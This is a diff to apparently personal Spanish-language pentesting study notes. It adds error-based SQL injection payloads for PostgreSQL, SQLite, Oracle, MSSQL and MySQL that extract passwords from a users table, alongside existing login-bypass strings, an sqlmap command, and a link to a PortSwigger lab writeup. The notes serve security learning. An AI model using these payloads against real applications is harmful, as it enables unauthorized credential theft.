@@ -34,7 +34,20 @@ sqlmap -u "http://target.com/products.php?id=1" -D public_db -T users --columns 
 -- Bypass de login simple
 admin' OR '1'='1' --
 admin' #
--- Error-based SQLi (ejemplo en WHERE clause)
+
+-- Error-based SQLi - PostgreSQL/SQLite (CAST a int, lectura directa del valor en el mensaje)
+' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
+
+-- Error-based SQLi - PostgreSQL/Oracle/SQLite con concatenacion (compacto, util si hay limite de longitud)
+'||CAST((SELECT password FROM users LIMIT 1)AS int)||'
+
+-- Error-based SQLi - MS SQL Server
+' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users))--
+
+-- Error-based SQLi - MySQL (XPath via extractvalue, ya que no hay CAST directo a int aprovechable)
+' AND extractvalue(rand(),concat(0x3a,(SELECT password FROM users LIMIT 1)))--
+
+-- Error-based SQLi - MySQL clasico (duplicate key con COUNT/GROUP BY, fallback cuando los anteriores estan filtrados)
 ' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT version()), 0x7e, FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
 ```
 
@@ -47,3 +60,4 @@ admin' #
 ## Referencias
 - Kim, P. (2018). *The Hacker Playbook 3*. Secure Planet, LLC.
 - MITRE Corporation. (2024). ATT&CK Technique T1190: Exploit Public-Facing Application. https://attack.mitre.org/techniques/T1190/
+- Writeup propio: [`learning/portswigger/visible-error-based-sql-injection/writeup.md`](../../../learning/portswigger/visible-error-based-sql-injection/writeup.md) — ejemplo end-to-end del CAST PostgreSQL.
